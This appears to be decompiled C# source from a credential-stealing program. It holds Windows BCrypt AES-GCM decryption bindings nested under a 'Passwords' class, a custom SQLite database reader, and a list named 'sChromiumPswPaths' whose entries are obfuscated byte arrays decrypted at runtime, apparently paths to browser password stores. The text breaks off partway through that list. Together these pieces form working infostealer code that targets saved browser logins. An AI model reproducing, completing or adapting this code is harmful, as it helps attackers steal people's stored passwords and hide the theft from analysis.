				// Token: 0x060000C5 RID: 197
				[DllImport("bcrypt.dll", EntryPoint = "BCryptSetProperty")]
				internal static extern uint BCryptSetAlgorithmProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);

				// Token: 0x060000C6 RID: 198
				[DllImport("bcrypt.dll")]
				public static extern uint BCryptImportKey(IntPtr hAlgorithm, IntPtr hImportKey, [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbInput, int cbInput, uint dwFlags);

				// Token: 0x060000C7 RID: 199
				[DllImport("bcrypt.dll")]
				public static extern uint BCryptDestroyKey(IntPtr hKey);

				// Token: 0x060000C8 RID: 200
				[DllImport("bcrypt.dll")]
				internal static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref Program.Passwords.cBCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, ref int pcbResult, int dwFlags);

				// Token: 0x040000FB RID: 251
				public const uint ERROR_SUCCESS = 0U;

				// Token: 0x040000FC RID: 252
				public const uint BCRYPT_PAD_PSS = 8U;

				// Token: 0x040000FD RID: 253
				public const uint BCRYPT_PAD_OAEP = 4U;

				// Token: 0x040000FE RID: 254
				public static readonly byte[] BCRYPT_KEY_DATA_BLOB_MAGIC = BitConverter.GetBytes(1296188491);

				// Token: 0x040000FF RID: 255
				public static readonly string BCRYPT_OBJECT_LENGTH = "ObjectLength";

				// Token: 0x04000100 RID: 256
				public static readonly string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";

				// Token: 0x04000101 RID: 257
				public static readonly string BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength";

				// Token: 0x04000102 RID: 258
				public static readonly string BCRYPT_CHAINING_MODE = "ChainingMode";

				// Token: 0x04000103 RID: 259
				public static readonly string BCRYPT_KEY_DATA_BLOB = "KeyDataBlob";

				// Token: 0x04000104 RID: 260
				public static readonly string BCRYPT_AES_ALGORITHM = "AES";

				// Token: 0x04000105 RID: 261
				public static readonly string MS_PRIMITIVE_PROVIDER = "Microsoft Primitive Provider";

				// Token: 0x04000106 RID: 262
				public static readonly int BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG = 1;

				// Token: 0x04000107 RID: 263
				public static readonly int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 1;

				// Token: 0x04000108 RID: 264
				public static readonly uint STATUS_AUTH_TAG_MISMATCH = 3221266434U;

				// Token: 0x02000037 RID: 55
				public struct BCRYPT_PSS_PADDING_INFO
				{
					// Token: 0x060000CA RID: 202 RVA: 0x0000298D File Offset: 0x00000B8D
					public BCRYPT_PSS_PADDING_INFO(string pszAlgId, int cbSalt)
					{
						this.pszAlgId = pszAlgId;
						this.cbSalt = cbSalt;
					}

					// Token: 0x04000109 RID: 265
					[MarshalAs(UnmanagedType.LPWStr)]
					public string pszAlgId;

					// Token: 0x0400010A RID: 266
					public int cbSalt;
				}

				// Token: 0x02000038 RID: 56
				public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
				{
					// Token: 0x060000CB RID: 203 RVA: 0x00007894 File Offset: 0x00005A94
					public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag)
					{
						this = default(Program.Passwords.cBCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO);
						this.dwInfoVersion = Program.Passwords.cBCrypt.BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
						this.cbSize = Marshal.SizeOf(typeof(Program.Passwords.cBCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
						if (iv != null)
						{
							this.cbNonce = iv.Length;
							this.pbNonce = Marshal.AllocHGlobal(this.cbNonce);
							Marshal.Copy(iv, 0, this.pbNonce, this.cbNonce);
						}
						if (aad != null)
						{
							this.cbAuthData = aad.Length;
							this.pbAuthData = Marshal.AllocHGlobal(this.cbAuthData);
							Marshal.Copy(aad, 0, this.pbAuthData, this.cbAuthData);
						}
						if (tag != null)
						{
							this.cbTag = tag.Length;
							this.pbTag = Marshal.AllocHGlobal(this.cbTag);
							Marshal.Copy(tag, 0, this.pbTag, this.cbTag);
							this.cbMacContext = tag.Length;
							this.pbMacContext = Marshal.AllocHGlobal(this.cbMacContext);
						}
					}

					// Token: 0x060000CC RID: 204 RVA: 0x00007974 File Offset: 0x00005B74
					public void Dispose()
					{
						if (this.pbNonce != IntPtr.Zero)
						{
							Marshal.FreeHGlobal(this.pbNonce);
						}
						if (this.pbTag != IntPtr.Zero)
						{
							Marshal.FreeHGlobal(this.pbTag);
						}
						if (this.pbAuthData != IntPtr.Zero)
						{
							Marshal.FreeHGlobal(this.pbAuthData);
						}
						if (this.pbMacContext != IntPtr.Zero)
						{
							Marshal.FreeHGlobal(this.pbMacContext);
						}
					}

					// Token: 0x0400010B RID: 267
					public int cbSize;

					// Token: 0x0400010C RID: 268
					public int dwInfoVersion;

					// Token: 0x0400010D RID: 269
					public IntPtr pbNonce;

					// Token: 0x0400010E RID: 270
					public int cbNonce;

					// Token: 0x0400010F RID: 271
					public IntPtr pbAuthData;

					// Token: 0x04000110 RID: 272
					public int cbAuthData;

					// Token: 0x04000111 RID: 273
					public IntPtr pbTag;

					// Token: 0x04000112 RID: 274
					public int cbTag;

					// Token: 0x04000113 RID: 275
					public IntPtr pbMacContext;

					// Token: 0x04000114 RID: 276
					public int cbMacContext;

					// Token: 0x04000115 RID: 277
					public int cbAAD;

					// Token: 0x04000116 RID: 278
					public long cbData;

					// Token: 0x04000117 RID: 279
					public int dwFlags;
				}

				// Token: 0x02000039 RID: 57
				public struct BCRYPT_KEY_LENGTHS_STRUCT
				{
					// Token: 0x04000118 RID: 280
					public int dwMinLength;

					// Token: 0x04000119 RID: 281
					public int dwMaxLength;

					// Token: 0x0400011A RID: 282
					public int dwIncrement;
				}

				// Token: 0x0200003A RID: 58
				public struct BCRYPT_OAEP_PADDING_INFO
				{
					// Token: 0x060000CD RID: 205 RVA: 0x0000299D File Offset: 0x00000B9D
					public BCRYPT_OAEP_PADDING_INFO(string alg)
					{
						this.pszAlgId = alg;
						this.pbLabel = IntPtr.Zero;
						this.cbLabel = 0;
					}

					// Token: 0x0400011B RID: 283
					[MarshalAs(UnmanagedType.LPWStr)]
					public string pszAlgId;

					// Token: 0x0400011C RID: 284
					public IntPtr pbLabel;

					// Token: 0x0400011D RID: 285
					public int cbLabel;
				}
			}
		}

		// Token: 0x0200003B RID: 59
		internal class SQLite
		{
			// Token: 0x060000CE RID: 206 RVA: 0x000079F8 File Offset: 0x00005BF8
			public SQLite(string fileName)
			{
				this._fileBytes = File.ReadAllBytes(fileName);
				this._pageSize = this.ConvertToULong(16, 2);
				this._dbEncoding = this.ConvertToULong(56, 4);
				this.ReadMasterTable(100L);
			}

			// Token: 0x060000CF RID: 207 RVA: 0x00007A58 File Offset: 0x00005C58
			public string GetValue(int rowNum, int field)
			{
				string result;
				try
				{
					if (rowNum >= this._tableEntries.Length)
					{
						result = null;
					}
					else
					{
						result = ((field >= this._tableEntries[rowNum].Content.Length) ? null : this._tableEntries[rowNum].Content[field]);
					}
				}
				catch
				{
					result = "";
				}
				return result;
			}

			// Token: 0x060000D0 RID: 208 RVA: 0x000029B8 File Offset: 0x00000BB8
			public int GetRowCount()
			{
				return this._tableEntries.Length;
			}

			// Token: 0x060000D1 RID: 209 RVA: 0x00007AC0 File Offset: 0x00005CC0
			private bool ReadTableFromOffset(ulong offset)
			{
				bool result;
				try
				{
					if (this._fileBytes[(int)(checked((IntPtr)offset))] == 13)
					{
						uint num = (uint)(this.ConvertToULong((int)offset + 3, 2) - 1UL);
						int num2 = 0;
						if (this._tableEntries != null)
						{
							num2 = this._tableEntries.Length;
							Array.Resize<Program.SQLite.TableEntry>(ref this._tableEntries, this._tableEntries.Length + (int)num + 1);
						}
						else
						{
							this._tableEntries = new Program.SQLite.TableEntry[num + 1U];
						}
						for (uint num3 = 0U; num3 <= num; num3 += 1U)
						{
							ulong num4 = this.ConvertToULong((int)offset + 8 + (int)(num3 * 2U), 2);
							if (offset != 100UL)
							{
								num4 += offset;
							}
							int num5 = this.Gvl((int)num4);
							this.Cvl((int)num4, num5);
							int num6 = this.Gvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL));
							this.Cvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL), num6);
							ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1L);
							int num8 = this.Gvl((int)num7);
							int num9 = num8;
							long num10 = this.Cvl((int)num7, num8);
							Program.SQLite.RecordHeaderField[] array = null;
							long num11 = (long)(num7 - (ulong)((long)num8) + 1UL);
							int num12 = 0;
							while (num11 < num10)
							{
								Array.Resize<Program.SQLite.RecordHeaderField>(ref array, num12 + 1);
								int num13 = num9 + 1;
								num9 = this.Gvl(num13);
								array[num12].Type = this.Cvl(num13, num9);
								array[num12].Size = (long)((array[num12].Type <= 9L) ? ((ulong)this._sqlDataTypeSize[(int)(checked((IntPtr)array[num12].Type))]) : ((ulong)((!Program.SQLite.IsOdd(array[num12].Type)) ? ((array[num12].Type - 12L) / 2L) : ((array[num12].Type - 13L) / 2L))));
								num11 = num11 + (long)(num9 - num13) + 1L;
								num12++;
							}
							if (array != null)
							{
								this._tableEntries[num2 + (int)num3].Content = new string[array.Length];
								int num14 = 0;
								for (int i = 0; i <= array.Length - 1; i++)
								{
									if (array[i].Type > 9L)
									{
										if (!Program.SQLite.IsOdd(array[i].Type))
										{
											if (this._dbEncoding == 1UL)
											{
												this._tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
											}
											else if (this._dbEncoding == 2UL)
											{
												this._tableEntries[num2 + (int)num3].Content[i] = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
											}
											else if (this._dbEncoding == 3UL)
											{
												this._tableEntries[num2 + (int)num3].Content[i] = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
											}
										}
										else
										{
											this._tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
										}
									}
									else
									{
										this._tableEntries[num2 + (int)num3].Content[i] = Convert.ToString(this.ConvertToULong((int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size));
									}
									num14 += (int)array[i].Size;
								}
							}
						}
					}
					else if (this._fileBytes[(int)(checked((IntPtr)offset))] == 5)
					{
						uint num15 = (uint)(this.ConvertToULong((int)(offset + 3UL), 2) - 1UL);
						for (uint num16 = 0U; num16 <= num15; num16 += 1U)
						{
							uint num17 = (uint)this.ConvertToULong((int)offset + 12 + (int)(num16 * 2U), 2);
							this.ReadTableFromOffset((this.ConvertToULong((int)(offset + (ulong)num17), 4) - 1UL) * this._pageSize);
						}
						this.ReadTableFromOffset((this.ConvertToULong((int)(offset + 8UL), 4) - 1UL) * this._pageSize);
					}
					result = true;
				}
				catch
				{
					result = false;
				}
				return result;
			}

			// Token: 0x060000D2 RID: 210 RVA: 0x00007F2C File Offset: 0x0000612C
			private void ReadMasterTable(long offset)
			{
				try
				{
					byte b = this._fileBytes[(int)(checked((IntPtr)offset))];
					if (b != 5)
					{
						if (b == 13)
						{
							ulong num = this.ConvertToULong((int)offset + 3, 2) - 1UL;
							int num2 = 0;
							if (this._masterTableEntries != null)
							{
								num2 = this._masterTableEntries.Length;
								Array.Resize<Program.SQLite.SqliteMasterEntry>(ref this._masterTableEntries, this._masterTableEntries.Length + (int)num + 1);
							}
							else
							{
								this._masterTableEntries = new Program.SQLite.SqliteMasterEntry[num + 1UL];
							}
							for (ulong num3 = 0UL; num3 <= num; num3 += 1UL)
							{
								ulong num4 = this.ConvertToULong((int)offset + 8 + (int)num3 * 2, 2);
								if (offset != 100L)
								{
									num4 += (ulong)offset;
								}
								int num5 = this.Gvl((int)num4);
								this.Cvl((int)num4, num5);
								int num6 = this.Gvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL));
								this.Cvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL), num6);
								ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1L);
								int num8 = this.Gvl((int)num7);
								int num9 = num8;
								long num10 = this.Cvl((int)num7, num8);
								long[] array = new long[5];
								for (int i = 0; i <= 4; i++)
								{
									int startIdx = num9 + 1;
									num9 = this.Gvl(startIdx);
									array[i] = this.Cvl(startIdx, num9);
									array[i] = (long)((array[i] <= 9L) ? ((ulong)this._sqlDataTypeSize[(int)(checked((IntPtr)array[i]))]) : ((ulong)((!Program.SQLite.IsOdd(array[i])) ? ((array[i] - 12L) / 2L) : ((array[i] - 13L) / 2L))));
								}
								if (this._dbEncoding == 1UL || this._dbEncoding == 2UL)
								{
									if (this._dbEncoding == 1UL)
									{
										this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
									}
									else if (this._dbEncoding == 2UL)
									{
										this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
									}
									else if (this._dbEncoding == 3UL)
									{
										this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
									}
								}
								this._masterTableEntries[num2 + (int)num3].RootNum = (long)this.ConvertToULong((int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2]), (int)array[3]);
								if (this._dbEncoding == 1UL)
								{
									this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
								}
								else if (this._dbEncoding == 2UL)
								{
									this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
								}
								else if (this._dbEncoding == 3UL)
								{
									this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
								}
							}
						}
					}
					else
					{
						uint num11 = (uint)(this.ConvertToULong((int)offset + 3, 2) - 1UL);
						for (int j = 0; j <= (int)num11; j++)
						{
							uint num12 = (uint)this.ConvertToULong((int)offset + 12 + j * 2, 2);
							if (offset == 100L)
							{
								this.ReadMasterTable((long)((this.ConvertToULong((int)num12, 4) - 1UL) * this._pageSize));
							}
							else
							{
								this.ReadMasterTable((long)((this.ConvertToULong((int)(offset + (long)((ulong)num12)), 4) - 1UL) * this._pageSize));
							}
						}
						this.ReadMasterTable((long)((this.ConvertToULong((int)offset + 8, 4) - 1UL) * this._pageSize));
					}
				}
				catch
				{
				}
			}

			// Token: 0x060000D3 RID: 211 RVA: 0x00008378 File Offset: 0x00006578
			public bool ReadTable(string tableName)
			{
				bool result;
				try
				{
					int num = -1;
					for (int i = 0; i <= this._masterTableEntries.Length; i++)
					{
						if (string.Compare(this._masterTableEntries[i].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
						{
							num = i;
							break;
						}
					}
					if (num == -1)
					{
						result = false;
					}
					else
					{
						string[] array = this._masterTableEntries[num].SqlStatement.Substring(this._masterTableEntries[num].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(new char[]
						{
							','
						});
						for (int j = 0; j <= array.Length - 1; j++)
						{
							array[j] = array[j].TrimStart(new char[0]);
							int num2 = array[j].IndexOf(' ');
							if (num2 > 0)
							{
								array[j] = array[j].Substring(0, num2);
							}
							if (array[j].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
							{
								Array.Resize<string>(ref this._fieldNames, j + 1);
								this._fieldNames[j] = array[j];
							}
						}
						result = this.ReadTableFromOffset((ulong)((this._masterTableEntries[num].RootNum - 1L) * (long)this._pageSize));
					}
				}
				catch
				{
					result = false;
				}
				return result;
			}

			// Token: 0x060000D4 RID: 212 RVA: 0x000084CC File Offset: 0x000066CC
			private ulong ConvertToULong(int startIndex, int size)
			{
				ulong result;
				try
				{
					if (size > 8 | size == 0)
					{
						result = 0UL;
					}
					else
					{
						ulong num = 0UL;
						for (int i = 0; i <= size - 1; i++)
						{
							num = (num << 8 | (ulong)this._fileBytes[startIndex + i]);
						}
						result = num;
					}
				}
				catch
				{
					result = 0UL;
				}
				return result;
			}

			// Token: 0x060000D5 RID: 213 RVA: 0x00008528 File Offset: 0x00006728
			private int Gvl(int startIdx)
			{
				int result;
				try
				{
					if (startIdx > this._fileBytes.Length)
					{
						result = 0;
					}
					else
					{
						for (int i = startIdx; i <= startIdx + 8; i++)
						{
							if (i > this._fileBytes.Length - 1)
							{
								return 0;
							}
							if ((this._fileBytes[i] & 128) != 128)
							{
								return i;
							}
						}
						result = startIdx + 8;
					}
				}
				catch
				{
					result = 0;
				}
				return result;
			}

			// Token: 0x060000D6 RID: 214 RVA: 0x00008598 File Offset: 0x00006798
			private long Cvl(int startIdx, int endIdx)
			{
				long result;
				try
				{
					endIdx++;
					byte[] array = new byte[8];
					int num = endIdx - startIdx;
					bool flag = false;
					if (num == 0 | num > 9)
					{
						result = 0L;
					}
					else if (num == 1)
					{
						array[0] = (this._fileBytes[startIdx] & 127);
						result = BitConverter.ToInt64(array, 0);
					}
					else
					{
						if (num == 9)
						{
							flag = true;
						}
						int num2 = 1;
						int num3 = 7;
						int num4 = 0;
						if (flag)
						{
							array[0] = this._fileBytes[endIdx - 1];
							endIdx--;
							num4 = 1;
						}
						for (int i = endIdx - 1; i >= startIdx; i += -1)
						{
							if (i - 1 >= startIdx)
							{
								array[num4] = (byte)((this._fileBytes[i] >> num2 - 1 & 255 >> num2) | (int)this._fileBytes[i - 1] << num3);
								num2++;
								num4++;
								num3--;
							}
							else if (!flag)
							{
								array[num4] = (byte)(this._fileBytes[i] >> num2 - 1 & 255 >> num2);
							}
						}
						result = BitConverter.ToInt64(array, 0);
					}
				}
				catch
				{
					result = 0L;
				}
				return result;
			}

			// Token: 0x060000D7 RID: 215 RVA: 0x0000296C File Offset: 0x00000B6C
			private static bool IsOdd(long value)
			{
				return (value & 1L) == 1L;
			}

			// Token: 0x0400011E RID: 286
			private readonly byte[] _sqlDataTypeSize = new byte[]
			{
				0,
				1,
				2,
				3,
				4,
				6,
				8,
				8,
				0,
				0
			};

			// Token: 0x0400011F RID: 287
			private readonly ulong _dbEncoding;

			// Token: 0x04000120 RID: 288
			private readonly byte[] _fileBytes;

			// Token: 0x04000121 RID: 289
			private readonly ulong _pageSize;

			// Token: 0x04000122 RID: 290
			private string[] _fieldNames;

			// Token: 0x04000123 RID: 291
			private Program.SQLite.SqliteMasterEntry[] _masterTableEntries;

			// Token: 0x04000124 RID: 292
			private Program.SQLite.TableEntry[] _tableEntries;

			// Token: 0x0200003C RID: 60
			private struct RecordHeaderField
			{
				// Token: 0x04000125 RID: 293
				public long Size;

				// Token: 0x04000126 RID: 294
				public long Type;
			}

			// Token: 0x0200003D RID: 61
			private struct TableEntry
			{
				// Token: 0x04000127 RID: 295
				public string[] Content;
			}

			// Token: 0x0200003E RID: 62
			private struct SqliteMasterEntry
			{
				// Token: 0x04000128 RID: 296
				public string ItemName;

				// Token: 0x04000129 RID: 297
				public long RootNum;

				// Token: 0x0400012A RID: 298
				public string SqlStatement;
			}
		}

		// Token: 0x0200003F RID: 63
		internal sealed class Paths
		{
			// Token: 0x0400012B RID: 299
			public static string[] sChromiumPswPaths = new string[]
			{
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					191,
					144,
					50,
					4,
					176,
					103,
					41,
					226,
					163,
					145,
					184,
					198,
					37,
					147,
					201,
					246,
					15,
					80,
					188,
					217,
					224,
					55,
					94,
					195,
					60,
					36,
					195,
					150,
					34,
					219,
					225,
					21
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					66,
					190,
					240,
					189,
					196,
					112,
					68,
					209,
					120,
					66,
					32,
					128,
					51,
					187,
					11,
					106,
					133,
					186,
					29,
					203,
					189,
					184,
					20,
					80,
					22,
					110,
					247,
					203,
					200,
					139,
					145,
					252
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					235,
					71,
					60,
					105,
					141,
					89,
					135,
					64,
					7,
					55,
					22,
					242,
					173,
					137,
					97,
					111,
					206,
					79,
					207,
					177,
					151,
					51,
					114,
					222,
					203,
					93,
					6,
					206,
					108,
					141,
					97,
					221
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					73,
					24,
					163,
					202,
					103,
					163,
					250,
					131,
					58,
					254,
					109,
					200,
					0,
					101,
					128,
					192,
					177,
					205,
					31,
					137,
					135,
					207,
					160,
					228,
					106,
					123,
					85,
					109,
					55,
					byte.MaxValue,
					16,
					57
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					94,
					125,
					152,
					164,
					215,
					224,
					18,
					60,
					32,
					98,
					147,
					169,
					150,
					48,
					141,
					211,
					192,
					129,
					56,
					148,
					7,
					104,
					31,
					144,
					122,
					249,
					59,
					25,
					71,
					162,
					241,
					69,
					98,
					84,
					243,
					115,
					233,
					26,
					59,
					183,
					252,
					7,
					8,
					237,
					21,
					222,
					0,
					157
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					139,
					161,
					110,
					219,
					171,
					17,
					246,
					186,
					22,
					213,
					4,
					215,
					141,
					253,
					17,
					173,
					215,
					53,
					171,
					41,
					246,
					99,
					184,
					29,
					177,
					20,
					156,
					97,
					116,
					105,
					188,
					242
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					190,
					77,
					154,
					38,
					44,
					145,
					237,
					67,
					174,
					9,
					133,
					3,
					58,
					246,
					93,
					41,
					23,
					35,
					235,
					203,
					108,
					171,
					65,
					71,
					56,
					233,
					66,
					13,
					202,
					51,
					79,
					41
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					62,
					210,
					240,
					33,
					118,
					184,
					243,
					141,
					77,
					133,
					0,
					235,
					139,
					86,
					39,
					25,
					137,
					185,
					88,
					124,
					221,
					174,
					169,
					88,
					91,
					11,
					213,
					207,
					43,
					146,
					75,
					243
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					62,
					0,
					196,
					29,
					187,
					130,
					95,
					54,
					171,
					116,
					232,
					214,
					233,
					238,
					169,
					220,
					87,
					81,
					58,
					192,
					55,
					32,
					9,
					66,
					192,
					71,
					163,
					194,
					155,
					180,
					1,
					100
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					248,
					132,
					208,
					253,
					161,
					159,
					142,
					173,
					129,
					48,
					103,
					48,
					159,
					71,
					82,
					190,
					211,
					175,
					88,
					121,
					54,
					47,
					62,
					205,
					43,
					35,
					160,
					92,
					160,
					146,
					80,
					219
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					160,
					221,
					244,
					224,
					234,
					124,
					235,
					177,
					76,
					91,
					97,
					50,
					47,
					65,
					63,
					227,
					74,
					50,
					249,
					90,
					53,
					48,
					13,
					166,
					106,
					36,
					144,
					79,
					133,
					138,
					58,
					173
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					14,
					78,
					82,
					180,
					74,
					84,
					229,
					48,
					85,
					125,
					151,
					44,
					44,
					245,
					236,
					69,
					139,
					52,
					31,
					12,
					236,
					152,
					84,
					192,
					7,
					253,
					207,
					160,
					82,
					205,
					206,
					216
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					80,
					37,
					192,
					228,
					231,
					129,
					178,
					111,
					104,
					225,
					219,
					4,
					152,
					121,
					224,
					204,
					47,
					223,
					134,
					64,
					65,
					137,
					96,
					90,
					39,
					174,
					0,
					233,
					231,
					244,
					222,
					81
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					193,
					191,
					13,
					199,
					192,
					122,
					144,
					200,
					83,
					128,
					6,
					28,
					13,
					132,
					90,
					7,
					29,
					217,
					70,
					36,
					4,
					149,
					132,
					62,
					242,
					153,
					217,
					247,
					182,
					13,
					180,
					100
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					191,
					8,
					54,
					18,
					102,
					8,
					237,
					252,
					81,
					68,
					237,
					30,
					28,
					29,
					171,
					167,
					37,
					11,
					209,
					77,
					139,
					81,
					1,
					98,
					185,
					217,
					150,
					213,
					121,
					123,
					68,
					82,
					53,
					254,
					128,
					68,
					133,
					32,
					78,
					35,
					53,
					212,
					98,
					35,
					135,
					101,
					229,
					112,
					43,
					179,
					17,
					51,
					150,
					27,
					145,
					232,
					59,
					202,
					27,
					195,
					245,
					91,
					244,
					53
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					124,
					243,
					34,
					12,
					158,
					74,
					249,
					212,
					5,
					90,
					133,
					132,
					35,
					216,
					217,
					22,
					217,
					55,
					243,
					252,
					51,
					87,
					241,
					238,
					86,
					244,
					62,
					37,
					95,
					154,
					18,
					210,
					62,
					206,
					164,
					16,
					182,
					192,
					15,
					85,
					48,
					23,
					118,
					190,
					110,
					166,
					231,
					219
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					112,
					174,
					206,
					195,
					60,
					254,
					140,
					154,
					222,
					29,
					174,
					131,
					97,
					154,
					190,
					225,
					101,
					102,
					44,
					184,
					116,
					3,
					222,
					149,
					173,
					77,
					23,
					224,
					108,
					61,
					110,
					83
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					168,
					208,
					166,
					82,
					192,
					153,
					44,
					149,
					17,
					233,
					52,
					199,
					126,
					180,
					93,
					48,
					18,
					157,
					146,
					139,
					52,
					61,
					229,
					244,
					233,
					177,
					174,
					202,
					13,
					20,
					68,
					248
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					15,
					171,
					27,
					72,
					143,
					86,
					53,
					189,
					140,
					83,
					1,
					120,
					66,
					90,
					66,
					28,
					128,
					139,
					207,
					118,
					135,
					205,
					39,
					142,
					89,
					231,
					22,
					111,
					194,
					199,
					245,
					22
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					64,
					252,
					183,
					118,
					9,
					181,
					137,
					115,
					42,
					20,
					107,
					204,
					169,
					49,
					101,
					240,
					160,
					210,
					28,
					182,
					65,
					1,
					170,
					136,
					179,
					86,
					242,
					2,
					40,
					236,
					39,
					92
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					163,
					202,
					80,
					117,
					26,
					124,
					142,
					96,
					200,
					150,
					88,
					164,
					24,
					244,
					151,
					69,
					200,
					214,
					2,
					103,
					223,
					49,
					243,
					222,
					70,
					137,
					79,
					85,
					208,
					132,
					160,
					180
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					190,
					180,
					48,
					187,
					130,
					241,
					22,
					142,
					148,
					81,
					86,
					118,
					125,
					198,
					67,
					134,
					168,
					170,
					218,
					153,
					252,
					65,
					45,
					99,
					146,
					136,
					184,
					169,
					8,
					176,
					254,
					158
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					134,
					62,
					128,
					238,
					85,
					244,
					104,
					139,
					79,
					49,
					203,
					166,
					37,
					19,
					150,
					80,
					195,
					12,
					211,
					168,
					230,
					85,
					8,
					141,
					82,
					13,
					200,
					163,
					193,
					61,
					249,
					18
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					189,
					176,
					161,
					91,
					124,
					7,
					222,
					38,
					230,
					226,
					175,
					16,
					213,
					160,
					182,
					221,
					133,
					88,
					75,
					233,
					51,
					39,
					227,
					90,
					53,
					56,
					98,
					251,
					118,
					191,
					198,
					4,
					38,
					3,
					145,
					152,
					83,
					170,
					23,
					225,
					66,
					207,
					208,
					132,
					167,
					27,
					63,
					43
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					13,
					6,
					120,
					217,
					132,
					74,
					167,
					141,
					165,
					239,
					104,
					198,
					115,
					212,
					98,
					108,
					230,
					36,
					207,
					96,
					112,
					142,
					221,
					116,
					224,
					149,
					170,
					246,
					80,
					191,
					143,
					130
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					59,
					208,
					82,
					153,
					38,
					145,
					53,
					186,
					128,
					79,
					177,
					14,
					101,
					235,
					46,
					148,
					230,
					52,
					225,
					181,
					155,
					81,
					183,
					213,
					37,
					54,
					26,
					129,
					9,
					171,
					114,
					201
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					210,
					110,
					31,
					64,
					140,
					5,
					137,
					32,
					239,
					70,
					133,
					139,
					182,
					28,
					116,
					149,
					137,
					179,
					177,
					211,
					237,
					32,
					56,
					74,
					238,
					183,
					94,
					93,
					153,
					52,
					180,
					166
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					127,
					26,
					51,
					8,
					51,
					33,
					160,
					156,
					24,
					156,
					118,
					176,
					53,
					117,
					49,
					254,
					byte.MaxValue,
					109,
					181,
